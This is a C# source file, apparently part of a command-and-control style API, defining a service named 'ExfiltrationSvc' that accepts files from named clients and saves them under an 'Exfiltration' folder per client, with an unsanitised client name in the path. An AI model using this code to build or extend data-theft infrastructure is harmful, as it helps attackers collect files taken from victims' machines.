using Version_1_API.Auxiliary;
using Version_1_API.Model;

namespace Version_1_API.Services
{
    public class ExfiltrationSvc
    {
        private static ExfiltrationSvc _instance;

        private ExfiltrationSvc()
        {
        }

        public static ExfiltrationSvc GetInstance()
        {
            if (_instance == null)
            {
                _instance = new ExfiltrationSvc();
            }
            return _instance;
        }

        public Response SubmitFile(FileSubmission file)
        {
            try
            {
                bool writeSuccessful = (file.isBinary)?
                    FileHandler.WriteBinaryFile($".\\Exfiltration\\{file.clientName}\\", file):
                    FileHandler.WriteTextFile($".\\Exfiltration\\{file.clientName}\\", file);

                if (writeSuccessful)
                {
                    return new Response(
                        (int)EApiExecCode.SUCCESS, "File successfully submitted.", true.ToString());
                }
                else {
                    return new Response((int)EApiExecCode.FAIL, "No file contents.", false.ToString()); 
                }
            }
            catch(FormatException)
            {
                // results from invalid Base64 content
                return new Response((int)EApiExecCode.ERROR, "Invalid content format.", false.ToString());
            }
            catch(IOException)
            {
                return new Response((int)EApiExecCode.ERROR, "Error saving provided file.", false.ToString());
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.StackTrace);
                return new Response(
                    (int)EApiExecCode.ERROR, "Unexpected error occured. Try again later.", false.ToString());
            }
        }
    }
}
